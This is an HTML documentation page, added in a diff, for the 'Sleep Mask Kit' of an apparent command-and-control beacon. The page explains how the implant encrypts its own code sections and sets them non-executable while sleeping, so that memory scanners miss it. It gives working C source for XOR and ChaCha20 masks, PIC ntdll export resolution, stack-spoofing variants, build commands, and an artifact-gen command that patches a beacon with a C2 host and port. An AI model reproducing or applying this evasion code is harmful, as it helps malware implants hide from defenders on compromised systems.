@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Sleep Mask Kit</title>
+<link rel="stylesheet" href="style.css">
+</head><body>
+<nav class="crumbs"><a href="index.html">Home</a> &raquo; Sleep Mask Kit</nav>
+
+<h1>Sleep Mask Kit</h1>
+
+<p>Sleep Mask Kit allows replacing the beacon's built-in sleep logic with a custom
+PIC shellcode blob. While sleeping the beacon encrypts its executable sections, changes their
+protection to RW, and performs the delay. This makes the beacon invisible to memory scanners.</p>
+
+<ul class="toc">
+<li><a href="#arch">Architecture</a></li>
+<li><a href="#api">API (SleepMaskCtx)</a></li>
+<li><a href="#contract">Mask Contract</a></li>
+<li><a href="#build">Build</a></li>
+<li><a href="#variants">Ready-to-use Variants</a></li>
+<li><a href="#writing">Writing a Custom Mask</a></li>
+<li><a href="#x86-pitfalls">x86 Pitfalls</a></li>
+<li><a href="#example-minimal">Example: Minimal Mask</a></li>
+<li><a href="#example-chacha">Example: ChaCha20</a></li>
+<li><a href="#integration">Integration with the Beacon</a></li>
+</ul>
+
+<!-- ====================================================================== -->
+<h2 id="arch">Architecture</h2>
+
+<p>The beacon PE has special sections for sleep obfuscation:</p>
+
+<table>
+<tr><th>Section</th><th>Contents</th><th>Encrypted during sleep?</th></tr>
+<tr><td><code>.text</code></td><td>Beacon code (tasking, commands, crypto)</td><td>Yes</td></tr>
+<tr><td><code>.rdata</code></td><td>Constants, import tables</td><td>Yes</td></tr>
+<tr><td><code>.sleep</code></td><td>Trampoline (masked_sleep, NT function resolution)</td><td>No</td></tr>
+<tr><td><code>.slpmsk</code></td><td>Slot for the custom shellcode (8192 bytes)</td><td>No</td></tr>
+<tr><td><code>.co2cfg</code></td><td>BeaconState (configuration)</td><td>No</td></tr>
+</table>
+
+<h3>Execution Flow</h3>
+<pre>
+beacon_run()
+  +-- masked_sleep(ms)                     [.sleep section]
+       |-- find_self_base()                VirtualQuery -> module base
+       |-- Walk PE sections -> regions[]   (only .text, .rdata)
+       |-- bc_random(key, 16)              generate XOR key
+       |-- Resolve NtProtectVirtualMemory, NtDelayExecution, etc.
+       |-- IF .slpmsk patched:
+       |       [4-byte EP offset] -> call user mask blob
+       |   ELSE:
+       |       call default_mask() (built-in XOR + NtDelayExecution)
+       +-- Zero key, return
+</pre>
+
+<h3>Blob Format (.slpmsk)</h3>
+<p>The blob is the extracted <code>.text</code> section of the compiled mask with a 4-byte header:</p>
+<pre>
+[uint32_t LE: offset from blob start to entry point]
+[... entire .text section code ...]
+</pre>
+<p>Since the linker uses <code>/MERGE:.rdata=.text</code>, all data
+(strings, tables) is merged into <code>.text</code> before the code. The entry point is usually
+not at zero offset — the header specifies the exact offset.</p>
+
+<div class="note">
+Maximum blob size: <b>8176 bytes</b> (8192 - 16 bytes for the sentinel).
+If the compiled mask exceeds this size, artifact-gen will refuse to patch.
+</div>
+
+<!-- ====================================================================== -->
+<h2 id="api">API (SleepMaskCtx)</h2>
+
+<p>The trampoline fills the <code>SleepMaskCtx</code> structure and passes a pointer
+to it into the mask. Definition in <code>kit/sleepmask/sleep_mask_api.h</code>:</p>
+
+<h3>SleepRegion</h3>
+<pre>
+typedef struct SleepRegion {
+    void*    base;           // virtual address of the region
+    uint32_t size;           // size in bytes
+    uint32_t original_prot;  // original PAGE_* protection
+} SleepRegion;
+</pre>
+
+<h3>SleepMaskCtx</h3>
+<pre>
+typedef struct SleepMaskCtx {
+    // ---- Regions to encrypt ----
+    SleepRegion regions[16];   // .text, .rdata (filled by the trampoline)
+    uint32_t    region_count;  // number of filled elements
+
+    // ---- Crypto material ----
+    uint8_t     key[16];       // random 16-byte key (new each cycle)
+
+    // ---- Sleep parameters ----
+    uint32_t    sleep_ms;      // delay in milliseconds
+    uint8_t     jitter_pct;    // jitter percentage (0-99)
+    uint8_t     _pad[3];
+
+    // ---- Pointers to NT functions (from ntdll.dll) ----
+    NTSTATUS (*NtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+    NTSTATUS (*NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER Delay);
+    NTSTATUS (*NtWaitForSingleObject)(HANDLE, BOOL, PLARGE_INTEGER);
+
+    // ---- Kernel32 ----
+    BOOL (*FlushInstructionCache)(HANDLE hProcess, const void*, SIZE_T);
+
+    // ---- Auxiliary ----
+    HANDLE  process_handle;    // pseudo-handle (HANDLE)-1
+    void*   ntdll_base;        // ntdll.dll base (for resolving additional functions)
+} SleepMaskCtx;
+</pre>
+
+<h3>Field Descriptions</h3>
+<table>
+<tr><th>Field</th><th>Type</th><th>Description</th></tr>
+<tr><td><code>regions[]</code></td><td>SleepRegion[16]</td>
+    <td>Array of memory regions to encrypt. Filled by the trampoline from the PE section table.
+    Contains only <code>.text</code> and <code>.rdata</code> (unless merged).</td></tr>
+<tr><td><code>region_count</code></td><td>uint32_t</td>
+    <td>Number of valid elements in <code>regions[]</code>.</td></tr>
+<tr><td><code>key[16]</code></td><td>uint8_t[16]</td>
+    <td>Random key generated by <code>bc_random()</code>. Can be used as a
+    seed for a custom encryption algorithm (ChaCha20, AES, etc.).</td></tr>
+<tr><td><code>sleep_ms</code></td><td>uint32_t</td>
+    <td>Sleep time in milliseconds (from <code>BeaconState.sleep_ms</code>).</td></tr>
+<tr><td><code>jitter_pct</code></td><td>uint8_t</td>
+    <td>Jitter percentage (0 = exact timer, 50 = &plusmn;50% of sleep_ms).</td></tr>
+<tr><td><code>NtProtectVirtualMemory</code></td><td>function ptr</td>
+    <td>Change memory protection. Used for RW before encryption and restoration after.</td></tr>
+<tr><td><code>NtDelayExecution</code></td><td>function ptr</td>
+    <td>Simple delay (like Sleep). Negative value = relative time.</td></tr>
+<tr><td><code>NtWaitForSingleObject</code></td><td>function ptr</td>
+    <td>Wait for an object. Preferable to NtDelayExecution (cleaner stack during scanning).</td></tr>
+<tr><td><code>FlushInstructionCache</code></td><td>function ptr</td>
+    <td>Flush instruction cache after decryption (mandatory on ARM, recommended on x86/x64).</td></tr>
+<tr><td><code>process_handle</code></td><td>HANDLE</td>
+    <td>Pseudo-handle of the current process (<code>(HANDLE)-1</code>). Pass to NtProtectVirtualMemory.</td></tr>
+<tr><td><code>ntdll_base</code></td><td>void*</td>
+    <td>Base address of ntdll.dll. Can be used to resolve additional functions
+    (NtCreateEvent, NtQueueApcThread, etc.) by parsing the export directory.</td></tr>
+</table>
+
+<!-- ====================================================================== -->
+<h2 id="contract">Mask Contract</h2>
+
+<p>The custom code <b>must</b> perform the following sequence:</p>
+
+<ol>
+<li><b>Change protection to RW</b> — <code>NtProtectVirtualMemory(..., PAGE_READWRITE, ...)</code>
+    for each region. Removes Execute — a scanner will not see executable beacon code.</li>
+<li><b>Encrypt regions</b> — XOR, ChaCha20, AES, or any symmetric algorithm.
+    Key: <code>ctx-&gt;key[16]</code> (or derived from it).</li>
+<li><b>Perform the delay</b> — <code>NtDelayExecution</code>, <code>NtWaitForSingleObject</code>,
+    timer-queue APC, or another wait mechanism.</li>
+<li><b>Decrypt regions</b> — the same operation in reverse order.</li>
+<li><b>Restore protection</b> — return <code>original_prot</code> for each region.</li>
+<li><b>FlushInstructionCache</b> — flush the instruction cache.</li>
+</ol>
+
+<div class="warning">
+<b>FORBIDDEN</b> to call any beacon functions — its <code>.text</code> section
+is encrypted while the mask is executing! All required functions must be
+resolved via <code>ctx-&gt;ntdll_base</code> or obtained from <code>ctx</code>.
+</div>
+
+<h3>PIC Code Rules</h3>
+<ul>
+<li>No global variables or static data.</li>
+<li>No string literals (<code>"NtCreateEvent"</code>) — only stack-allocated character arrays.</li>
+<li>No CRT (malloc, printf, memcpy, etc.).</li>
+<li>Entry point <code>sleep_mask_entry</code> must be the <b>first defined function</b> in the file.</li>
+<li>All helper functions are defined <b>after</b> the entry point.</li>
+<li>Calling convention: <code>__cdecl</code>.</li>
+<li>Maximum compiled code size: 8176 bytes.</li>
+</ul>
+
+<!-- ====================================================================== -->
+<h2 id="build">Build</h2>
+
+<h3>Automated (build_all.bat)</h3>
+<pre>
+cd kit\sleepmask
+build_all.bat
+</pre>
+<p>The script compiles all masks from <code>masks\</code> + <code>default_mask.c</code>
+for x64 and x86. Output: <code>bin\&lt;name&gt;.x64.bin</code> and <code>bin\&lt;name&gt;.x86.bin</code>.</p>
+
+<h3>Manual Build of a Single Mask</h3>
+<pre>
+REM x64:
+cl.exe /nologo /c /O2 /GS- /Zl /W3 /TC /I"kit\sleepmask" ^
+    /Fo"mask.obj" my_mask.c
+link.exe /nologo /NODEFAULTLIB /ENTRY:sleep_mask_entry ^
+    /SUBSYSTEM:CONSOLE /SECTION:.text,ER /MERGE:.rdata=.text ^
+    /OUT:mask.exe mask.obj
+python kit\sleepmask\extract_section.py mask.exe .text mask.x64.bin
+
+REM x86 (add /arch:IA32 and link x86_helpers.obj):
+cl.exe /nologo /c /O2 /GS- /Zl /W3 /TC /arch:IA32 /I"kit\sleepmask" ^
+    /Fo"mask.obj" my_mask.c
+cl.exe /nologo /c /O2 /GS- /Zl /TC /Fo"helpers.obj" ^
+    kit\sleepmask\x86_helpers.c
+link.exe /nologo /NODEFAULTLIB /ENTRY:sleep_mask_entry ^
+    /SUBSYSTEM:CONSOLE /SECTION:.text,ER /MERGE:.rdata=.text ^
+    /OUT:mask.exe mask.obj helpers.obj
+python kit\sleepmask\extract_section.py mask.exe .text mask.x86.bin
+</pre>
+
+<h3>Applying a Mask to the Beacon</h3>
+<pre>
+artifact-gen --input beacon64.exe --mask bin\chacha_sleep.x64.bin ^
+    --host 10.0.0.5 --port 443 --key ... --out patched.exe
+</pre>
+
+<h3>Compiler Flags</h3>
+<table>
+<tr><th>Flag</th><th>Purpose</th></tr>
+<tr><td><code>/O2</code></td><td>Optimize for speed (minimizes code size)</td></tr>
+<tr><td><code>/GS-</code></td><td>Disable stack cookies (no CRT initialization)</td></tr>
+<tr><td><code>/Zl</code></td><td>Do not reference default libraries</td></tr>
+<tr><td><code>/TC</code></td><td>Compile as C (not C++)</td></tr>
+<tr><td><code>/arch:IA32</code></td><td><b>x86 only!</b> Disables SSE — see <a href="#x86-pitfalls">x86 pitfalls</a></td></tr>
+<tr><td><code>/MERGE:.rdata=.text</code></td><td>Merge .rdata into .text (single blob)</td></tr>
+<tr><td><code>/ENTRY:sleep_mask_entry</code></td><td>PE entry point = mask entry point</td></tr>
+<tr><td><code>/NODEFAULTLIB</code></td><td>No CRT</td></tr>
+</table>
+
+<!-- ====================================================================== -->
+<h2 id="variants">Ready-to-use Variants</h2>
+
+<table>
+<tr><th>Mask</th><th>Directory</th><th>Encryption</th><th>Sleep Method</th><th>Notes</th></tr>
+<tr><td><b>default</b></td>
+    <td><code>default_mask.c</code></td>
+    <td>XOR-16</td>
+    <td>NtDelayExecution</td>
+    <td>Baseline variant, minimal code size</td></tr>
+<tr><td><b>ekko_timer</b></td>
+    <td><code>masks/ekko_timer/</code></td>
+    <td>XOR-16</td>
+    <td>NtWaitForSingleObject (unsignaled event)</td>
+    <td>Stack shows ntdll, not beacon</td></tr>
+<tr><td><b>chacha_sleep</b></td>
+    <td><code>masks/chacha_sleep/</code></td>
+    <td>ChaCha20 (256-bit key)</td>
+    <td>NtWaitForSingleObject (unsignaled event)</td>
+    <td>No pattern in encrypted memory (key period &gt; section size)</td></tr>
+<tr><td><b>foliage_apc</b></td>
+    <td><code>masks/foliage_apc/</code></td>
+    <td>XOR-16</td>
+    <td>NtWaitForSingleObject (unsignaled event)</td>
+    <td>Foliage style: clean stack, no executable pages</td></tr>
+<tr><td><b>stack_spoof</b></td>
+    <td><code>masks/stack_spoof/</code></td>
+    <td>XOR-16</td>
+    <td>NtWaitForSingleObject</td>
+    <td>Spoofs return addresses on the stack (RET gadget in ntdll)</td></tr>
+</table>
+
+<div class="opsec">
+<b>ekko_timer</b> and <b>foliage_apc</b> — the thread stack during scanning contains no beacon addresses.
+<b>chacha_sleep</b> — encrypted memory is statistically indistinguishable from random data.
+<b>stack_spoof</b> — all stack frames point into signed modules (ntdll).
+</div>
+
+<!-- ====================================================================== -->
+<h2 id="writing">Writing a Custom Mask</h2>
+
+<h3>Template</h3>
+<pre>
+#include "sleep_mask_api.h"
+
+// Helper functions (forward declarations).
+static int   pic_strcmp(const char* a, const char* b);
+static void* pic_get_proc(void* module_base, const char* func_name);
+
+// ---- ENTRY POINT (must be the FIRST function in the file) ----
+void __cdecl sleep_mask_entry(SleepMaskCtx* ctx) {
+    uint32_t i;
+    SIZE_T sz;
+    PVOID base;
+    ULONG old_prot;
+
+    // 1. Protection -> RW
+    for (i = 0; i &lt; ctx->region_count; ++i) {
+        base = ctx->regions[i].base;
+        sz   = (SIZE_T)ctx->regions[i].size;
+        ctx->NtProtectVirtualMemory(
+            ctx->process_handle, &amp;base, &amp;sz, 0x04, &amp;old_prot);
+    }
+
+    // 2. Encrypt
+    for (i = 0; i &lt; ctx->region_count; ++i) {
+        uint8_t* p = (uint8_t*)ctx->regions[i].base;
+        uint32_t L = ctx->regions[i].size;
+        for (uint32_t n = 0; n &lt; L; ++n)
+            p[n] ^= ctx->key[n &amp; 15];
+    }
+
+    // 3. Delay
+    {
+        LARGE_INTEGER delay;
+        delay.QuadPart = -(LONGLONG)ctx->sleep_ms * 10000LL;
+        ctx->NtDelayExecution(FALSE, &amp;delay);
+    }
+
+    // 4. Decrypt (XOR is symmetric)
+    for (i = 0; i &lt; ctx->region_count; ++i) {
+        uint8_t* p = (uint8_t*)ctx->regions[i].base;
+        uint32_t L = ctx->regions[i].size;
+        for (uint32_t n = 0; n &lt; L; ++n)
+            p[n] ^= ctx->key[n &amp; 15];
+    }
+
+    // 5. Restore protection
+    for (i = 0; i &lt; ctx->region_count; ++i) {
+        base = ctx->regions[i].base;
+        sz   = (SIZE_T)ctx->regions[i].size;
+        ctx->NtProtectVirtualMemory(
+            ctx->process_handle, &amp;base, &amp;sz,
+            (ULONG)ctx->regions[i].original_prot, &amp;old_prot);
+    }
+
+    // 6. Flush
+    ctx->FlushInstructionCache(ctx->process_handle, 0, 0);
+}
+
+// ---- Helper functions (AFTER entry point) ----
+// ...
+</pre>
+
+<h3>Resolving Additional NT Functions</h3>
+<p>If functions not included in <code>SleepMaskCtx</code> are needed (e.g.
+<code>NtCreateEvent</code>, <code>NtClose</code>), they can be obtained by
+parsing the ntdll export directory at address <code>ctx-&gt;ntdll_base</code>:</p>
+
+<pre>
+// Stack strings (PIC!) -- NOT literals!
+char s_nce[] = {'N','t','C','r','e','a','t','e','E','v','e','n','t',0};
+
+// Resolve via pic_get_proc (PE export table parsing)
+typedef NTSTATUS (__stdcall *pfn_NtCreateEvent)(HANDLE*, DWORD, void*, int, BOOL);
+pfn_NtCreateEvent NtCreateEvent =
+    (pfn_NtCreateEvent)pic_get_proc(ctx->ntdll_base, s_nce);
+</pre>
+
+<h3>pic_get_proc Implementation</h3>
+<p>The standard implementation used in all kit masks:</p>
+<pre>
+static int pic_strcmp(const char* a, const char* b) {
+    while (*a &amp;&amp; *a == *b) { a++; b++; }
+    return (unsigned char)*a - (unsigned char)*b;
+}
+
+static void* pic_get_proc(void* module_base, const char* func_name) {
+    unsigned char* base = (unsigned char*)module_base;
+    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
+    IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
+    IMAGE_DATA_DIRECTORY* exp_dir =
+        &amp;nt->OptionalHeader.DataDirectory[0]; // IMAGE_DIRECTORY_ENTRY_EXPORT
+    if (!exp_dir->VirtualAddress) return 0;
+    IMAGE_EXPORT_DIRECTORY* exp =
+        (IMAGE_EXPORT_DIRECTORY*)(base + exp_dir->VirtualAddress);
+    DWORD* names    = (DWORD*)(base + exp->AddressOfNames);
+    WORD*  ordinals = (WORD*)(base + exp->AddressOfNameOrdinals);
+    DWORD* funcs    = (DWORD*)(base + exp->AddressOfFunctions);
+    for (DWORD i = 0; i &lt; exp->NumberOfNames; ++i) {
+        if (pic_strcmp((const char*)(base + names[i]), func_name) == 0)
+            return (void*)(base + funcs[ordinals[i]]);
+    }
+    return 0;
+}
+</pre>
+
+<!-- ====================================================================== -->
+<h2 id="x86-pitfalls">x86 Pitfalls</h2>
+
+<p>On x64, code is inherently position-independent (RIP-relative addressing).
+On x86, MSVC generates absolute addresses, which breaks PIC shellcode.
+Three main problems:</p>
+
+<h3>1. String Literals</h3>
+<div class="warning">
+On x86 a string <code>"NtCreateEvent"</code> is placed in <code>.rdata</code>,
+and the reference to it is <code>push 0x004010xx</code> (absolute address). When the shellcode
+is loaded at a different address this pointer is invalid.
+</div>
+<p><b>Solution:</b> declare all strings as character arrays on the stack:</p>
+<pre>
+// WRONG (breaks on x86):
+void* p = pic_get_proc(base, "NtCreateEvent");
+
+// CORRECT (PIC on any architecture):
+char s[] = {'N','t','C','r','e','a','t','e','E','v','e','n','t',0};
+void* p = pic_get_proc(base, s);
+</pre>
+
+<h3>2. SSE Instructions with Absolute Addresses</h3>
+<div class="warning">
+MSVC uses SSE2 by default for stack array initialization:
+<code>movaps xmm0, [0x00401000]</code> — loads a 16-byte template from .rdata
+at an absolute address.
+</div>
+<p><b>Solution:</b> compile x86 masks with the <code>/arch:IA32</code> flag, which
+completely disables SSE instructions. All operations use x87/ALU.</p>
+
+<h3>3. 64-bit Multiplication (__allmul)</h3>
+<div class="warning">
+The expression <code>-(LONGLONG)sleep_ms * 10000LL</code> on x86 generates a call to
+<code>__allmul</code> — an internal CRT function for 64-bit multiplication.
+This function must be available at call time.
+</div>
+<p><b>For PIC blobs:</b> during linking <code>x86_helpers.obj</code> is included
+(contains <code>__allmul</code>, <code>__allshr</code>, <code>__aullshr</code>).
+The code ends up in the blob's <code>.text</code> and works correctly.</p>
+<p><b>For the beacon's built-in mask:</b> <code>__allmul</code> resides in the <code>.text</code>
+section of the beacon. If the mask encrypted <code>.text</code> before computing the delay —
+calling <code>__allmul</code> will crash. Therefore all 64-bit operations
+<b>must be performed BEFORE encryption</b>.</p>
+
+<pre>
+// CORRECT: compute delay BEFORE encryption
+LARGE_INTEGER delay;
+delay.QuadPart = -(LONGLONG)ctx->sleep_ms * 10000LL;  // calls __allmul
+
+// ... then encrypt ...
+xor_encrypt(regions);
+
+// ... sleep with the pre-computed value ...
+ctx->NtDelayExecution(FALSE, &amp;delay);
+</pre>
+
+<h3>x86 Checklist</h3>
+<table>
+<tr><th>Check</th><th>What to Look For</th></tr>
+<tr><td>Strings</td><td>All strings as <code>char s[] = {'.','.','.',0};</code></td></tr>
+<tr><td>SSE</td><td>Flag <code>/arch:IA32</code> in cl.exe</td></tr>
+<tr><td>__allmul</td><td>All <code>int64</code> operations BEFORE encrypting .text
+    (or inside the PIC blob where __allmul is linked together with the code)</td></tr>
+<tr><td>helpers.obj</td><td>x86 build links with <code>x86_helpers.obj</code></td></tr>
+</table>
+
+<!-- ====================================================================== -->
+<h2 id="example-minimal">Example: Minimal Mask</h2>
+
+<p>File <code>default_mask.c</code> — the simplest working mask (XOR-16 + NtDelayExecution):</p>
+<pre>
+#include "sleep_mask_api.h"
+
+void __cdecl sleep_mask_entry(SleepMaskCtx* ctx) {
+    uint32_t i;
+    SIZE_T sz;
+    PVOID base;
+    ULONG old_prot;
+
+    // 1. RW
+    for (i = 0; i &lt; ctx->region_count; ++i) {
+        base = ctx->regions[i].base;
+        sz   = (SIZE_T)ctx->regions[i].size;
+        ctx->NtProtectVirtualMemory(
+            ctx->process_handle, &amp;base, &amp;sz, 0x04, &amp;old_prot);
+    }
+
+    // 2. XOR encrypt
+    for (i = 0; i &lt; ctx->region_count; ++i) {
+        uint8_t* p = (uint8_t*)ctx->regions[i].base;
+        uint32_t L = ctx->regions[i].size;
+        for (uint32_t n = 0; n &lt; L; ++n)
+            p[n] ^= ctx->key[n &amp; 15];
+    }
+
+    // 3. Sleep
+    {
+        LARGE_INTEGER delay;
+        delay.QuadPart = -(LONGLONG)ctx->sleep_ms * 10000LL;
+        ctx->NtDelayExecution(FALSE, &amp;delay);
+    }
+
+    // 4. XOR decrypt
+    for (i = 0; i &lt; ctx->region_count; ++i) {
+        uint8_t* p = (uint8_t*)ctx->regions[i].base;
+        uint32_t L = ctx->regions[i].size;
+        for (uint32_t n = 0; n &lt; L; ++n)
+            p[n] ^= ctx->key[n &amp; 15];
+    }
+
+    // 5. Restore
+    for (i = 0; i &lt; ctx->region_count; ++i) {
+        base = ctx->regions[i].base;
+        sz   = (SIZE_T)ctx->regions[i].size;
+        ctx->NtProtectVirtualMemory(
+            ctx->process_handle, &amp;base, &amp;sz,
+            (ULONG)ctx->regions[i].original_prot, &amp;old_prot);
+    }
+
+    // 6. Flush
+    ctx->FlushInstructionCache(ctx->process_handle, 0, 0);
+}
+</pre>
+
+<!-- ====================================================================== -->
+<h2 id="example-chacha">Example: ChaCha20 + NtWaitForSingleObject</h2>
+
+<p>File <code>masks/chacha_sleep/mask.c</code> demonstrates:</p>
+<ul>
+<li>Using a full stream cipher (256-bit key derived from 16-byte seed)</li>
+<li>Resolving additional functions from ntdll via <code>pic_get_proc</code></li>
+<li>Waiting via an unsignaled event (clean stack during scanning)</li>
+<li>Zeroing crypto material after use</li>
+</ul>
+
+<pre>
+void __cdecl sleep_mask_entry(SleepMaskCtx* ctx) {
+    // Key derivation: 16 -> 32 bytes key + 12 bytes nonce
+    uint8_t key32[32];
+    uint8_t nonce12[12];
+    for (int k = 0; k &lt; 16; ++k) {
+        key32[k] = ctx->key[k];
+        key32[16+k] = ctx->key[k] ^ 0xA5;
+    }
+    for (int k = 0; k &lt; 12; ++k) nonce12[k] = ctx->key[k + 4];
+
+    // Stack strings (PIC!)
+    char s_nce[] = {'N','t','C','r','e','a','t','e','E','v','e','n','t',0};
+    char s_nc[]  = {'N','t','C','l','o','s','e',0};
+
+    // Resolve additional functions from ntdll
+    pfn_NtCreateEvent NtCreateEvent =
+        (pfn_NtCreateEvent)pic_get_proc(ctx->ntdll_base, s_nce);
+    pfn_NtClose NtClose =
+        (pfn_NtClose)pic_get_proc(ctx->ntdll_base, s_nc);
+
+    // Create unsignaled event
+    HANDLE hEvent = 0;
+    int use_event = 0;
+    if (NtCreateEvent &amp;&amp; NtClose) {
+        if (NtCreateEvent(&amp;hEvent, 0x1F0003, 0, 1, FALSE) >= 0)
+            use_event = 1;
+    }
+
+    // 1. RW
+    // 2. ChaCha20 encrypt
+    // 3. NtWaitForSingleObject (timeout = sleep_ms)
+    // 4. ChaCha20 decrypt (same key + counter=0)
+    // 5. Restore protection
+    // 6. FlushInstructionCache + NtClose(hEvent)
+
+    // Zero crypto material
+    for (int k = 0; k &lt; 32; ++k) key32[k] = 0;
+    for (int k = 0; k &lt; 12; ++k) nonce12[k] = 0;
+}
+</pre>
+
+<div class="note">
+Full ChaCha20 source code (embedded in the shellcode) is in
+<code>kit/sleepmask/masks/chacha_sleep/mask.c</code>.
+The implementation is self-contained — no external library dependencies.
+</div>
+
+<!-- ====================================================================== -->
+<h2 id="integration">Integration with the Beacon</h2>
+
+<h3>How the Beacon Calls the Mask</h3>
+<ol>
+<li>The <code>masked_sleep(ms)</code> function in the <code>.sleep</code> section is called
+    from the beacon's main loop.</li>
+<li>The trampoline determines the module base via <code>VirtualQuery</code>.</li>
+<li>Walks the PE section table, selecting <code>.text</code> and <code>.rdata</code>
+    (skips <code>.sleep</code>, <code>.slpmsk</code>, <code>.co2cfg</code>).</li>
+<li>Generates a random 16-byte key (<code>bc_random</code>).</li>
+<li>Resolves NT functions from ntdll (stack strings, no .rdata patterns).</li>
+<li>Checks the <code>.slpmsk</code> section:
+    <ul>
+    <li>If it contains the sentinel <code>CO2H_SLPMASK_v1</code> — no mask is patched in,
+        calls the built-in <code>default_mask()</code>.</li>
+    <li>If the sentinel is overwritten — reads the 4-byte EP offset,
+        jumps to <code>g_slpmsk_slot + offset</code>.</li>
+    </ul></li>
+<li>After the mask returns — zeros the key, returns control to the beacon.</li>
+</ol>
+
+<h3>Sentinel Detection</h3>
+<p>Sentinel check is done byte-by-byte (without accessing .rdata) to
+prevent a false pattern match when <code>/MERGE:.rdata=.text</code> is used:</p>
+<pre>
+if (g_slpmsk_slot[0]  != 'C')  return 1; // patched
+if (g_slpmsk_slot[1]  != 'O')  return 1;
+...
+if (g_slpmsk_slot[15] != '\0') return 1;
+return 0;  // unpatched
+</pre>
+
+<h3>Section Memory Layout</h3>
+<pre>
++------------------+
+| .text            |  &lt;-- encrypted by the mask
+| .rdata           |  &lt;-- encrypted by the mask
++------------------+
+| .sleep           |  &lt;-- NOT encrypted (trampoline + default_mask)
++------------------+
+| .slpmsk          |  &lt;-- NOT encrypted (custom PIC blob)
++------------------+
+| .co2cfg          |  &lt;-- NOT encrypted (BeaconState)
++------------------+
+| .data, .bss      |  &lt;-- NOT encrypted (global variables)
++------------------+
+</pre>
+
+<h3>kit/sleepmask/ Directory Structure</h3>
+<pre>
+kit/sleepmask/
+  sleep_mask_api.h       API header (include in mask)
+  default_mask.c         Reference mask (XOR + NtDelayExecution)
+  x86_helpers.c          __allmul, __allshr for x86 (no-CRT)
+  extract_section.py     Script for extracting .text from PE
+  build_all.bat          Build all variants (x64 + x86)
+  masks/
+    ekko_timer/mask.c    Ekko style (NtWaitForSingleObject)
+    chacha_sleep/mask.c  ChaCha20 (256-bit + event wait)
+    foliage_apc/mask.c   Foliage style (NtWaitForSingleObject)
+    stack_spoof/mask.c   Return address stack spoofing
+  bin/                   Build output (.bin files)
+</pre>
+
+</body></html>
